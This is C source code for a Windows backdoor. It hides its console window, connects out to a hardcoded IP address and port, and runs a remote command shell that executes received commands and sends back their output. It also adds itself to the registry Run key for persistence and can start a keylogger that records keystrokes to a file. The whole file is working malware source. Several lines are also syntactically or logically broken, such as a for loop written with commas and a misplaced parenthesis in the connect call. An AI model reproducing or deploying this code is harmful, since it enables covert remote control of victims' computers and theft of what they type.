#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <wininet.h>
#include <string.h>
#include <windowsx.h>
#include <winuser.h>
#include <sys/stat.h>
#include <sys/types.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

// Keylogger
DWORD WINAPI keylogger() {
    int virtual_key, last_key_state[0xFF];
    int isCAPSLOCK, isNUMLOCK;
    int isL_SHIFT, isR_SHIFT;
    int isPressed;
    char showkey;
    char NUMCHAR[] = "!@#$%^&*()";
    char chars_vn[] = ",./;'-=`";
    char chars_vs[] = "<>?:_+~";
    char chars_va[] = "[\\]\';";
    char chars_vb[] = "{|}\"";
    FILE *keyPointer;
    char KEY_LOG_FILE[] = "keylog.txt";

    // Making last key state is equal to 0
    for (virtual_key = 0; virtual_key < 0xFF; virtual_key++) {
        last_key_state[virtual_key] = 0;
    }

    // Main loop
    while(1) {
        Sleep(10);
        
        // Get key state of CAPSLOCK, NUMLOCK, LEFT_SHIFT and RIGHT_SHIFT
        isCAPSLOCK = (GetKeyState(0x14)&0xFF)>0?1:0;
        isNUMLOCK = (GetKeyState(0x90)&0xFF)>0?1:0;
        isL_SHIFT = (GetKeyState(0xA0)&0xFF00)>0?1:0;
        isR_SHIFT = (GetKeyState(0xA1)&0xFF00)>0?1:0;

        // Checking state of all the virtual keys like Capslock, Shift, etc...
        for (virtual_key = 0, virtual_key < 0xFF, virtual_key++) {
            isPressed = (GetKeyState(virtual_key)&0xFF00)>0?1:0;
            showkey = (char)virtual_key;
            if (isPressed == 1 && last_key_state[virtual_key] == 0) {

                // Alphabets
                if (virtual_key >= 0x41 && virtual_key <= 0X5A) {
                    if (isCAPSLOCK == 0) {
                        if (isL_SHIFT && isR_SHIFT == 0) {
                            showkey = (char)(virtual_key + 0x20);
                        }
                    }

                    else if (isL_SHIFT == 1 || isR_SHIFT ==1) {
                        showkey = (char)(virtual_key + 0x20);
                    }
                }

                // Number characters
                else if (virtual_key >= 0x30 && virtual_key <= 0x39) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showkey = NUMCHAR[virtual_key - 0x30];
                    }
                }

                // Rightside numpad
                else if (virtual_key >= 0x60 && virtual_key <= 0x69 && isNUMLOCK == 1) {
                    showkey = (char)(virtual_key - 0x30);
                }

                // Printable characters (; = , - . / ? ` ~)
                else if (virtual_key >= 0xBA && virtual_key <= 0xC0) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showkey = chars_vs[virtual_key - 0xBA];
                    }

                    else {
                        showkey = chars_vn[virtual_key - 0xBA];
                    }
                }

                else if (virtual_key >= 0xDB && virtual_key <= 0xDF) {
                    if (isL_SHIFT == 1 || isR_SHIFT == 1) {
                        showkey = chars_vb[virtual_key - 0xDB];
                    }

                    else {
                        showkey = chars_va[virtual_key - 0xDB];
                    }
                }

                // For right side characters like ./*-+
                // And spacebar, tab and enter key
                else if (virtual_key == 0x0D) {
                    showkey = (char)0x0A;
                }

                else if (virtual_key >= 0x6A && virtual_key <= 0x6F) {
                    showkey = (char)(virtual_key - 0x40);
                }

                else if (virtual_key != 0x20 && virtual_key != 0x09) {
                    showkey = (char)0x00;
                }

                // Print and save captured keys
                if (showkey != (char)0x00) {
                    keyPointer = fopen(KEY_LOG_FILE, "a");
                    putc(showkey, keyPointer);
                    fclose(keyPointer);
                }
            }

            last_key_state[virtual_key] = isPressed;
        }
    }
}


int bootRun() {
    char error_val[128] = "Failed\n";
    char success_val[128] = "Created persistence at: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH];
    DWORD path_length = 0;

    path_length = GetModuleFileName(NULL, szPath, MAX_PATH);
    if (path_length == 0) { // If an error has occurred
        send(sock, error_val, sizeof(error_val), 0);
        return -1;
    }

    HKEY NewKey;
    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewKey) != ERROR_SUCCESS) {
        send(sock, error_val, sizeof(error_val), 0);
        return -1;
    }

    DWORD pathLenInBytes = path_length * sizeof(*szPath);
    if (RegSetValueEx(NewKey, TEXT("Test Backdoor"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewKey);
        send(sock, error_val, sizeof(error_val), 0);
        return -1;
    }

    RegCloseKey(NewKey);
    send(sock, success_val, sizeof(success_val), 0);
    return 0;
}


char *
str_cut(char str[], int slice_from, int slice_to) {
    if (str[0] == '\0') {
        return NULL;
    }

    char *buffer;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);

        if (abs(slice_to) > str_len - 1) {
            return NULL;
        }
        if (abs(slice_from) >  str_len) {
            slice_from = (-1) * str_len;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);

    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1) {
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;

    } else {
        return NULL;
    }

    buffer = calloc(buffer_len, sizeof(char));
    strncpy(buffer, str, buffer_len);
    return buffer;
}


void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[16384];

    while (1) {
        jump:
        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, 1024, 0);

        // If the key pressed is "q" then quit the program
        if (strncmp("q", buffer, 1) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        }

        else if (strncmp("cd ", buffer, 3) == 0) {
            chdir(str_cut(buffer, 3, 100));
        }

        else if (strncmp("persist", buffer, 7) == 0) {
            bootRun();
        }

        else if (strncmp("keylog_start", buffer, 12) == 0) {
            HANDLE thread = CreateThread(NULL, 0, keylogger, NULL, 0, NULL);
            goto jump;
        }

        else {
            FILE *fp;
            fp = _popen(buffer, "r");
            while(fgets(container, 1024, fp) != NULL) {
                strcat(total_response, container);
            }
            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // Make the console invisible when running the program
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0); // 0 is for hiding the window while activating another

    // Create a server to handle the connection
    struct sockaddr_in ServerAddr;
    unsigned short ServerPort;
    char *ServerIP;
    WSADATA wsaData; // This contains the informations of the socket

    ServerIP = "192.168.1.46"; // Enter your IP here
    ServerPort = 50000;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    sock  = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServerAddr, 0, sizeof(ServerAddr));
    ServerAddr.sin_family = AF_INET;
    ServerAddr.sin_addr.s_addr = inet_addr(ServerIP);
    ServerAddr.sin_port = htons(ServerPort);

    start:
    while (connect(sock, (struct sockaddr *) &ServerAddr, sizeof(ServerAddr) != 0)) {
        Sleep(10);
        goto start;
    }

    Shell();
}
